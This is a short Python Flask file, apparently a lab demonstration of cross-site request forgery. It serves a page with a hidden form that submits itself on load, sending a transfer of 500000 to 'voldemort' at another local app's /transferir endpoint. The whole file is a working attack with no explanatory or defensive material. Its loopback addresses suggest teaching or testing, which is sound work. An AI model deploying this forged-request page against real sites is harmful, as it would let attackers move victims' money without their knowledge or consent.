from flask import Flask, make_response, render_template, request
app = Flask(__name__)

texto = """
<!DOCTYPE html>
<html>
    <head>
    </head>
    <body>
        <form action="http://127.0.0.101:2020/transferir" method="POST" id="hahahaha">
            <input type="hidden" name="destinatario" value="voldemort" />
            <input type="hidden" name="valor" value="500000" />
        </form>
        <script type="text/javascript">
            document.getElementById("hahahaha").submit();
        </script>
    </body>
</html>
"""

@app.route("/")
def entrada():
    return texto

if __name__ == "__main__":
    app.run(port = 2021, host = "127.0.0.166")